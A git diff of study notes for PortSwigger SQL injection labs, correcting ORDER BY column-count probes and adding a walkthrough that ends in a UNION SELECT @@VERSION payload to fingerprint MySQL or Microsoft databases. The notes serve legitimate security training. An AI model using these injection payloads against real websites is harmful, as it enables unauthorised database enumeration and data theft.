@@ -32,11 +32,11 @@ Steps:
 1. Click on any filter item.
 2. Add ' to verify if sql injection exists.
 3. Use the Order Clause to check the number of items that are being returned.
-	3a. category=Gifts' ORDER BY 1--
+	3a. category=Gifts'+ORDER+BY+1--
 	Response: Returns products
-	3b. category=Gifts' ORDER BY 2--
+	3b. category=Gifts'+ORDER+BY+2--
 	Response: Returns products
-	3c. category=Gifts' ORDER BY 1--
+	3c. category=Gifts'+ORDER+BY+3--
 	Response: Internal Server Error
 4. Now we know that there are 2 items in the query.
 5. Check the type of items in the query using:
@@ -52,3 +52,28 @@ Steps:
 
 Note: We need to specify database name in case of oracle server thus we are using dual.
 Ref: https://www.techonthenet.com/oracle/questions/version.php
+
+
+###### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
+Endpoint:
+
+Steps:
+```
+1. Click on any filter item.
+2. Add ' to verify if sql injection exists.
+3. Use the Order Clause to check the number of items that are being returned.
+	3a. category=Gifts'+ORDER+BY+1--
+	Response: Returns products
+	3b. category=Gifts'+ORDER+BY+2--
+	Response: Returns products
+	3c. category=Gifts'+ORDER+BY+3--
+	Response: Internal server error
+4. Now we know that there are 2 items in the query.
+5. Check the type of items in the query using:
+6. category=Gifts'+UNION+SELECT+@@VERSION,'a'--+
+   Response: Database version information
+```
+
+Note: Database name is not necessary in when using UNION SELECT on non-oracle MYSQL.
+Ref: https://www.sqlshack.com/how-to-find-sql-server-version/
